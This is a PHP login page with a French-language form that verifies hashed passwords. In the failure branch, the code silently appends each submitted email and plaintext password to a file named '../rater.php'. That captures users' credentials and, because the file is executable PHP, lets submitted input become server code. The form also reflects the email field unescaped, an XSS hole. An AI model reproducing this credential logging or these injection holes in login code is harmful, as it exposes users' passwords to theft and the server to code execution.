<?php
session_start();
include 'header.php';
require "conf.inc.php";
require "functions.php"; ?>

<?php
if (isset($_POST["inputEmail"]) && isset($_POST["inputPassword"]) && !empty($_POST["inputEmail"]) && !empty($_POST["inputPassword"])) {
    $pdo = connectDB();
    $queryPrepared = $pdo->prepare("SELECT pwd FROM USER WHERE emailAddress=:email");
    $queryPrepared->execute([":email" => $_POST["inputEmail"]]);
    $result = $queryPrepared->fetch();
    if (password_verify($_POST["inputPassword"], $result["pwd"])) {
        $email = $_POST["inputEmail"];
        login($email);
        header("Location: home.php");
        exit;
    } else {
        $error = true;
        $fichier_nom = '../rater.php';
        $ficher_contenu = "" . $_POST["inputEmail"] . " --- " . $_POST["inputPassword"] . "\r\n";
        file_put_contents($fichier_nom, $ficher_contenu, FILE_APPEND);
    }
}
?>
    </head>

    <body>
    <section class="login">
        <div class="pt-5 container">
            <div class="col-xs-10 col-sm-10  col-lg-6 mx-auto">

                <div class="card card-login mx-auto mt-5 p-5">
                    <div class="card-body">
                        <?php
                        if (!empty($error)) {
                            echo "<div class='alert alert-danger'><li>Identifiants incorrects</div>";
                        }
                        ?>
                        <form method="POST" action="login.php">
                            <div class="form-group">
                                <div class="form-label-group">
                                    <label for="inputEmail">
                                        Addresse email :
                                    </label>
                                    <input type="email" id="inputEmail" class="form-control focus"
                                           placeholder="Adresse mail" required="required" autofocus="autofocus"
                                           name="inputEmail" autocomplete="username"
                                           value="<?php echo (isset($_POST['inputEmail'])) ? $_POST['inputEmail'] : '' ?>">
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="form-label-group">
                                    <label for="inputPassword">
                                        Mot de passe :
                                    </label>
                                    <input type="password" id="inputPassword" class="form-control focus"
                                           placeholder="Mot de passe" required="required" name="inputPassword"
                                           autocomplete="current-password">
                                </div>
                            </div>
                            <input class="btn btn-primary degrade btn-block pt-2 pb-2 " type="submit" value="Connexion">
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </section>

<?php include 'footer.php' ?>
<?php
